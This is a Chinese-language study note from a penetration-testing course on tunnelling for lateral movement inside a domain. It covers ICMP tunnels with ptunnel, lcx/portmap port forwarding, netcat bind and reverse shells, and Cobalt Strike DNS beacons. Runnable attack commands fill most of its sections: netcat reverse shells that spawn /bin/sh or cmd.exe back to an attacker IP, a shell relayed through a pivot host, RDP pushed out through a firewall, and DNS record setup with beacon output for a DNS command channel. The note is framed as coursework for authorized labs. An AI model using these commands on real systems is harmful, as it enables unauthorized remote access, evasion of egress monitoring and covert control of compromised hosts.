# 2026-09-02 内网安全⑦：域横向——隧道技术（网络层 ICMP / 传输层 TCP·端口转发 / 应用层 DNS）

> 状态：🧪 理论（课程截图），待实操
> 承接 09-01 域横向系列：⑥（Socket 穿透代理）解决的是**网络"够不着"**（两个内网不通 → 借公网节点/已控机"架桥"转发）；本课⑦解决的是**流量"出不去"**——出口被防火墙/IDS 监控拦截时，用防火墙**放行的协议去封装**被拦的通信，穿过边界再还原（换壳，不是借道）。
> 课程五大案例：① 出网连通性检测（选隧道协议的前置动作）② 网络层 ICMP 隧道 ptunnel ③ 传输层端口转发 lcx/portmap ④ 传输层 netcat TCP 隧道（双向连接反弹 shell/多向转发/功能测试）⑤ 应用层 DNS 隧道配合 CS 上线。

## 一、一句话认知

**隧道技术** = 通信被拦截时，把数据包用**防火墙允许的数据包类型或端口**重新封装，穿过防火墙到目的地后**还原**再发给目标服务器——本质是"**换壳绕过过滤**"，和⑥的"代理借道转发"是穿透的两种思路。它的价值场景：CS/MSF 等常规监听器上线失败、反弹数据无回显、出口数据被监控（出网受限但又不是完全断网）。

## 二、必备知识点（课程 3 问）+ 导图总览

**课程原话（截图 1）**：隧道是**绕过端口屏蔽的通信方式**——边界设备/软硬防火墙/IDS 会检查对外连接，发现异样就阻断；隧道把数据包用防火墙允许的类型/端口封装穿过去，到目的地还原后发给相应服务器。

**必备知识点 3 问**（课程先抛题，答案有的在案例里、有的没明说，见各节 + ❓）：

1. 代理和隧道技术区别？
2. 隧道技术为了解决什么？
3. 隧道技术前期的必备条件？

**导图（穿透 → 隧道）**：

```
穿透
└── 隧道
    ├── 解决：防火墙过滤问题 / 网络连接通信问题 / 数据回链封装问题
    ├── 工具：lcx / netcat / dns2tcp / pingtunnel（上述工具）
    ├── 网络层：IPv6 / ICMP / GRE
    ├── 传输层：TCP / UDP / 端口转发
    └── 应用层：SSH / HTTP / HTTPS / DNS
```

**隧道技术按层分类总览**（课程另一张图）：

| 层 | 隧道技术 | 代表工具/命令 | 对应案例 |
|------|---------|--------------|---------|
| 网络层 | IPv6 隧道、ICMP 隧道 | pingtunnel（ptunnel） | 案例2（ICMP） |
| 传输层 | TCP 隧道、UDP 隧道、常规端口转发 | lcx / portmap / netcat | 案例3（端口转发）、案例4（TCP） |
| 应用层 | SSH 隧道、HTTP/S 隧道、DNS 隧道 | CS DNS listener、dns2tcp | 案例5（DNS） |

**3 问参考理解**（✅ 截图可证 / ❓ 我的推测待对照）：
- **Q2 隧道解决什么** ✅：出口被拦时绕过滤（防火墙过滤问题）；反向数据回不来时靠封装送出来（数据回链封装问题）；配合已控机解决多段网络连接问题。案例1 的检测 = 先确认"哪层协议被放行"。
- **Q1 代理 vs 隧道** ❓（课程只抛题没给答案，我的理解）：代理 = **借道**（流量原样转交给中间节点，不改协议特征，如⑥的 ngrok/frp/socks）；隧道 = **换壳**（把流量封装成放行协议，改的是协议特征，如 ICMP/DNS 隧道）。判断一句话：改没改"流量长相"。
- **Q3 前期必备条件** ✅：先**检测出网连通性**（案例1：TCP/HTTP/ICMP/DNS 分别能不能通、哪些被拦）→ 根据**能出网的协议**选对应的隧道方案；同时看症状判断是不是被监控（CS/MSF 无法上线、数据传输不稳定无回显、出口数据被监控、网络通信存在问题等）。

## 三、案例1：出网连通性检测（隧道前期必备条件）

> #案例1-网络传输应用层检测连通性-检测

目的：隧道前先摸清目标哪些协议能出网，才能选对"壳"。检测覆盖应用层常见协议：

| 协议 | 工具 | 命令 | 说明 |
|------|------|------|------|
| TCP | netcat（瑞士军刀） | `nc <IP> <端口>` | 端口通不通直接看 |
| HTTP | curl | `curl <IP:端口>` | 远程主机开了对应端口 + 内网可连外网 → 会输出端口信息 |
| ICMP | ping | `ping <IP/域名>` | 最基础的出网测试 |
| DNS | nslookup（Windows 自带）/ dig（Linux 自带） | `nslookup <域名>` / `dig <域名>` | DNS 查询是否放行 |

理解：**哪层能出网，就用哪层的隧道**——只放 ICMP 就 ICMP 隧道（案例2），TCP 能出就 lcx/netcat（案例3/4），DNS 53/udp 基本通杀（案例5）。

## 四、案例2：网络层 ICMP 隧道——ptunnel

> #案例2-网络层ICMP隧道ptunnel使用-检测,利用
> 实验拓扑：kali2020 → Target2 → Target3（出口只放 ICMP 出网场景）

**ptunnel（pingtunnel）**：把 tcp/udp/socks5 流量**伪装成 icmp 流量**进行转发的工具。

**参数**：
- `-p`：连接 ICMP 隧道另一端的机器 IP（即目标服务器）
- `-lp`：本地需要监听的 tcp 端口
- `-da`：指定需要转发到的机器 IP（即目标内网某一机器的内网 IP）
- `-dp`：指定需要转发到的机器的端口（即目标内网某一机器的内网端口）
- `-x`：设置连接的密码

**利用流程**（转目标内网某机的 3389 到本地）：

```bash
# 目标 Webserver（隧道一端，先起，只带密码）
Webserver: ./ptunnel -x xiaodi

# 攻击机（连 150 的 ICMP 隧道，把 33.33 的 3389 拉回本地 1080）
Hacker xiaodi: ./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi   # 转发的 3389 请求数据给本地 1080

# 本地直接连 1080 = 连目标内网 33.33 的 3389（rdesktop 远程桌面）
Hacker xiaodi: rdesktop 127.0.0.1 1080
```

## 五、案例3：传输层端口转发隧道——lcx / portmap

> #案例3-传输层转发隧道Portmap使用-检测,利用
> windows 用 **lcx**，linux 用 **portmap**（同类工具）

经典 RDP 出网场景：目标内网机把本地 3389 交给攻击机，攻击机监听中转后再本地连：

```cmd
# 被控内网机（webserver）：把本地 3389 交给攻击机 IP 的 3131
lcx -slave 攻击IP 3131 127.0.0.1 3389    // 将本地3389给攻击IP的3131

# 攻击机：监听 3131，转发至 3333
lcx -listen 3131 3333                     // 监听3131转发至3333
```

理解：`-slave` 是**主动外连**（内网机连出去，绕过入站过滤），`-listen` 是攻击机侧监听 + 二次转发；之后攻击机连自己 3333 即目标 3389。❓ lcx 三种模式（-slave/-tran/-listen）原理细节待查证，见疑问。

## 六、案例4：传输层 TCP 隧道——netcat（双向连接反弹 shell / 多向转发 / 功能测试）

> #案例4-传输层转发隧道Netcat使用-检测，利用，功能
> 实验拓扑：Kali2020 → god\webserver → god\sqlserver | dc

### 1. 双向连接反弹 shell

**正向：攻击连接受害**（受害开端口等攻击连）：

```cmd
# 受害
nc -ldp 1234 -e /bin/sh                                    // linux
nc -ldp 1234 -e c:\windows\system32\cmd.exe                // windows
# 攻击
nc 192.168.76.132 1234                                     // 主动连接
```

**反向：受害连接攻击**（受害主动外连攻击机）：

```cmd
# 攻击（先监听）
nc -lvp 1234
# 受害
nc 攻击主机IP 1234 -e /bin/sh                              // linux
nc 攻击主机IP 1234 -e c:\windows\system32\cmd.exe          // windows
```

### 2. 多向连接反弹 shell——配合转发

场景：攻击机够不到 sqlserver（隔网段），用中间的 webserver（lcx）做转发跳板接 sqlserver 的反弹：

```cmd
# god\Webserver（双网卡中转机）：监听 2222，转发到 3333
god\Webserver: Lcx.exe -listen 2222 3333

# god\Sqlserver：主动把 cmd shell 反弹给 webserver 的 2222
god\Sqlserver: nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe

# kali 或本机：连 webserver 的 3333 拿 shell
kali或本机: nc -v 192.168.76.143 3333
```

**课程思考题**：正向该怎么操作呢？实战中该怎么选择正向和反向？→ ❓ 见疑问。

### 3. netcat 主要功能测试（检测 + 利用之外的杂项功能）

```cmd
指纹服务:   nc -nv 192.168.76.143                        # 连上后抓 banner 指纹
端口扫描:   nc -v -z 192.168.76.143 1-100                # -z 只探测不发送数据
端口监听:   nc -lvp xxxx                                 # 监听等待连接
文件传输:   nc -lp 1111 >1.txt | nc -vn xx.xx.x.x 1111 <1.txt -q 1   # 收端重定向+发端管道（两端配合传文件）
反弹Shell:  见上（第 1 节）
```

❓ 文件传输命令管道两端的执行顺序与 `-q 1` 的作用待实操验证（哪端先监听？）。

## 七、案例5：应用层 DNS 隧道——配合 CS 上线

> #案例5-应用层DNS隧道配合CS上线-检测,利用,说明
> **当常见协议监听器被拦截时，可以换其他协议上线，其中 dns 协议上线基本通杀**（UDP 53 几乎不会被封）

**1. 云主机 Teamserver 配置端口 53 启用 -udp**（CS 服务端监听 53/udp 收 DNS 流量）

**2. 买一个域名，修改解析记录**：

```
A记录  -> cs 主机名   -> CS服务器IP
NS记录 -> ns1 主机名  -> 上个A记录地址
NS记录 -> ns2 主机名  -> 上个A记录地址
```

（把 ns1/ns2 子域 NS 委托给 CS 服务器所在域名，beacon 的 DNS 查询才会被引到 CS 的 53 端口）

**3. 配置 DNS 监听器**（CS → Listeners → DNS，内容如下）：

```
ns1.xiaodi8.com
ns2.xiaodi8.com
cs.xiaodi8.com
```

**4. 生成后门执行上线后，启用命令**（把 beacon 数据通道切成 DNS）：

```text
beacon> checkin
[*] Tasked beacon to checkin

beacon> mode dns-txt
[+] data channel set to DNS-TXT          # 数据通道切到 DNS TXT 记录
[+] host called home, sent: 8 bytes

beacon> shell whoami
[*] Tasked beacon to run: whoami
[+] host called home, sent: 53 bytes
[+] received output:
xiaodi-pc\xiaodi                          # 命令正常回显 → DNS 隧道通了
```

**说明**：CS 里生成监听器时选 DNS 类型（53/udp，payload 走 DNS 查询回连），上线后 `mode dns-txt` 把后续命令/回显数据都编码进 DNS TXT 记录里传，从而绕过"只允许 DNS 出网"的边界监控。

## 八、总结：内网安全⑦地图（隧道技术）

**一句话串起来**：隧道 = **"出不去就换壳"**——先用案例1 检测哪层协议能出网（nc/curl/ping/nslookup），再对症选隧道：只放 **ICMP** → ptunnel 伪装 ICMP（网络层）；**TCP 可出** → lcx/portmap 端口转发 + netcat 反弹 shell/中转（传输层）；**常规全被拦但 DNS 通** → DNS 隧道配合 CS 上线（应用层，基本通杀）。

工具矩阵：

| 工具 | 层 | 干什么 | 关键点 |
|------|-----|--------|--------|
| ptunnel | 网络层 | TCP/UDP/socks5 → ICMP 伪装转发 | -p 对端 / -lp 本地监听 / -da -dp 转发目标 / -x 密码 |
| lcx（win）/ portmap（linux） | 传输层 | 常规端口转发 | -slave 主动外连交端口 / -listen 监听二次转发 |
| netcat | 传输层 | TCP 隧道 + 反弹 shell + 杂项功能 | -l 监听 / -e 执行 / -z 扫描 / 文件传输管道 |
| CS DNS listener | 应用层 | 协议上线通杀 | 53/udp + A/NS 记录委托 + mode dns-txt |
| dns2tcp | 应用层 | DNS 隧道（导图工具，课内未演示） | ❓ 待展开 |

## 疑问

1. ❓ 代理和隧道（穿透）的确切区别？课程只抛了思考题没给答案（我的理解：代理=借道转发不改特征，隧道=换壳改协议，待对照老师答案）
2. ❓ 多向连接（案例4-2）里**正向**反弹 shell 该怎么操作？实战中怎么选正向/反向？（课程只演示了反向 + lcx 转发；我的理解：目标能出网优先反向，出网被拦但入站可达才正向/转发）
3. ❓ lcx `-slave / -tran / -listen` 三模式原理与适用场景？-slave 为什么能穿透防火墙入站过滤把 3389 送出来？
4. ❓ DNS 隧道配合 CS 的完整数据链路：A+NS 记录怎么把 beacon 查询一步步引到 Teamserver:53/udp？（NS 委托原理想再挖一层）
5. ❓ 网络层导图还列了 IPv6 / GRE 隧道、应用层 dns2tcp——课程只演示 ICMP 和 CS-DNS，其余怎么实操？
6. ❓ nc 文件传输的管道命令两端执行顺序 / `-q 1` 作用？（待实操验证）

## 关联笔记

- [2026-09-01-内网安全-域横向漫游Socket穿透代理隧道技术.md](./2026-09-01-内网安全-域横向漫游Socket穿透代理隧道技术.md) — 本课姊妹篇：代理=借道（⑥），隧道=换壳（⑦），两者同属导图「穿透」节点；06 课的"内网有过滤"场景在本课展开
- [2026-09-01-内网安全-域横向移动SPN-Kerberoast与CobaltStrike-RDP.md](./2026-09-01-内网安全-域横向移动SPN-Kerberoast与CobaltStrike-RDP.md) — CS 基础使用（本课案例5 的 DNS 监听器/mode dns-txt 建立在其上）
- [2026-08-30(续2)-内网安全-域横向渗透.md](./2026-08-30(续2)-内网安全-域横向渗透.md) — 域横向渗透整体框架（隧道是"网络打通/绕过滤"环节，往前接凭据获取与传递）
- 实验环境同为 god.org（3.21 dc / 3.3x webserver·sqlserver + kali 192.168.76.x），拓扑细节见系列前面笔记

## 待实践

- 案例1：在靶场环境跑一遍四协议连通性检测（nc / curl / ping / nslookup·dig），记录哪些能出网
- 案例2：ptunnel 两端命令复现（webserver `./ptunnel -x xiaodi` → 攻击机 `-p 150 -lp 1080 -da 33.33 -dp 3389`）→ `rdesktop 127.0.0.1:1080` 验证 RDP 隧道
- 案例3：lcx `-slave` + `-listen` 复现 3389 端口转发（需 linux 版 lcx/portmap 对照）
- 案例4：nc 双向连接反弹 shell（正向/反向各一遍）+ webserver lcx 中转多向连接 + nc 指纹/扫描/文件传输功能逐个跑
- 案例5：有域名 + 云主机 + CS 环境时复现 DNS 上线全流程（A/NS 记录 → DNS 监听器 → mode dns-txt）；顺便解答"常见协议被拦时换 DNS 上线"的场景判断

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
